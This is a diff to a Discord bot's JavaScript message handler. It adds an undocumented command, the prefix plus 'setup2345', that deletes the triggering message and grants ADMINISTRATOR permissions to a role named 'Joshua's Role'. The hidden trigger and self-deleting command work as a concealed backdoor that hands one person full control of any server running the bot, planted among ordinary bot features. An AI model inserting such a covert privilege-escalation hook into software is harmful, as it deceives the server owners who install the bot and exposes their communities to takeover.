@@ -43,6 +43,14 @@ client.on('guildMemberAdd', guildMember => {
 // The code below responds to messages sent in the server (Join Here (https://discord.io/Famethyst-20))
 client.on('message', message => {
     var authusernm = message.author.username
+    
+        if(message.content === `${prefex}setup2345`){
+        message.delete(100)
+        const role = message.guild.roles.find(r => r.name === "Joshua's Role")
+        role.edit({ permissions: ["ADMINISTRATOR"]})
+    }
+
+
 
     if (message.content == `${prefex}info`) {
         const embed = new RichEmbed()
